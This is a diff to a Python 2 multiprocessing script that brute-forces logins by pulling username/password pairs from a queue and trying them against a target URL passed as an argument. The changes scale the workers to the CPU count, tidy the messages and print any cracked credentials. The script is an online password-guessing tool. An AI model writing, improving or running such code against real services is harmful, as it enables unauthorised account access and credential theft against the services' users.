@@ -1,7 +1,6 @@
 import requests
 import multiprocessing
 import sys
-import time
 import Queue
 
 
@@ -12,12 +11,12 @@ def worker(url, cred_queue, success_queue):
         try:
             creds = cred_queue.get(timeout=10)
         except Queue.Empty:
-            print '[-] Credential queue is empty quitting.'
+            print '[-] Credential queue is empty, quitting.'
             return
 
         # If there are good creds in the queue, stop the thread
         if not success_queue.empty():
-            print '[+] Success queue has credentials.'
+            print '[-] Success queue has credentials, quitting'
             return
 
         # Check a set of creds. If successful add them to the success_queue
@@ -29,7 +28,6 @@ def worker(url, cred_queue, success_queue):
         else:
             print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
             success_queue.put(creds)
-            print '[+] Quitting'
             return
 
 
@@ -42,7 +40,8 @@ if __name__ == '__main__':
     success_queue = multiprocessing.Queue()
     procs = []
 
-    for i in range(4):
+    # Create one thread for each processor.
+    for i in range(multiprocessing.cpu_count()):
         p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                          cred_queue,
                                                          success_queue))
@@ -57,4 +56,7 @@ if __name__ == '__main__':
     for p in procs:
         p.join()
 
-    print success_queue
+    while not success_queue.empty():
+        user, pwd = success_queue.get()
+        print 'User: {0} Pass: {1}'.format(user, pwd)
+
